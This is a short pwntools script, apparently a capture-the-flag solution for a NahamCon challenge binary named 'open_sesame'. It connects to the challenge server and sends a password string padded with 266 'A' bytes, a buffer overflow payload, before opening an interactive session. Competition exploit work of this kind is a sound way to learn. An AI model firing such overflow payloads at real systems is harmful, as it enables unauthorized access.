from pwn import *

# io = process('./open_sesame')
io = remote('challenge.nahamcon.com', 32566)

elf = context.binary = ELF('./open_sesame')

io.sendline(b"OpenSesame!!!\0" + (280-14)*b'A')
io.interactive()
